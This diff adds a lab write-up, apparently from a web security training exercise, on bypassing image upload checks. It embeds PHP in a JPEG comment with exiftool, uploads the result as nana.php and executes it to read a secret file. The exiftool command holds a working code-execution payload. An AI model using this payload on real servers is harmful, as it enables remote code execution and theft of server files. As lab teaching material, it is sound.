@@ -32,5 +32,48 @@ On outputting to a new file
 
 # Step 1 Map out the normal functionality of the image upload
 
+The functionality seems very similar to the previous labs, only none of the attacks that have worked so far are working here.
+
+# Step 2 Create a polyglot using exiftool
+
+Using it to view and unmodified nana.jpg
+
+![image](https://user-images.githubusercontent.com/83407557/171236157-69dcb82e-4ba8-456c-8d74-737e8b22dc6e.png)
+
+Adding a comment to insert my php code and outputting a new polyglot called nana.php
+
+```bash
+exiftool -Comment="<?php echo 'Executed Code--> ' . file_get_contents('/home/carlos/secret') . ' <--Executed Code'; ?>" nana.jpg -o nana.php
+```
+![image](https://user-images.githubusercontent.com/83407557/171237302-98de1d70-2d88-41f0-9707-7613b2dc9e08.png)
+
+Running exiftool on this new file I can see that it has my code as a comment but is keeping the jpg extension and jpeg filetype.
+
+![image](https://user-images.githubusercontent.com/83407557/171238960-1885e295-12aa-4fe4-a83d-f1ecbf8f224a.png)
+
+# Step 3 upload polyglot
+
+While trying to upload the php code normally I get this error
+
+![image](https://user-images.githubusercontent.com/83407557/171241755-868945da-9909-41d4-aaf1-06d9156bfafc.png)
+
+However, my polyglot uploads just fine
+
+![image](https://user-images.githubusercontent.com/83407557/171242528-2d2fb372-0728-430b-934c-e66e9da706a9.png)
+
+# Step 4 execute polyglot on server
+
+Going to the directory /files/avatars/nana.php it still tries to load it as an image...however I can see the secret the response between my execturd code markers:
+
+![image](https://user-images.githubusercontent.com/83407557/171244335-becb6382-a298-470c-b87e-b9741f85073a.png)
+
+This tells me the code did execute on the server and highlighted above is the secret.
+
+# Step 5 submit secret
+
+![image](https://user-images.githubusercontent.com/83407557/171245275-a9d3364d-bbbf-424b-9b97-c45823c63e35.png)
+
+![image](https://user-images.githubusercontent.com/83407557/171245489-00a7fe80-a349-4de2-8404-a9f183c4dcff.png)
+
 
 
